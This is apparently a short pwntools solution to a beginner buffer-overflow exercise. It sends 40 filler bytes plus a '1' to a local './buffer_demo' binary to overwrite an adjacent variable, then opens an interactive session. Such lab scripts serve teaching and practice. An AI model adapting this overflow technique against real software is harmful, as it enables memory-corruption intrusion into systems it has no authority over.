from pwn import *

p = process('./buffer_demo')

payload = b'A' * (0x34 - 0xC)
payload += b'1'

p.sendline(payload)

p.interactive()
p.close()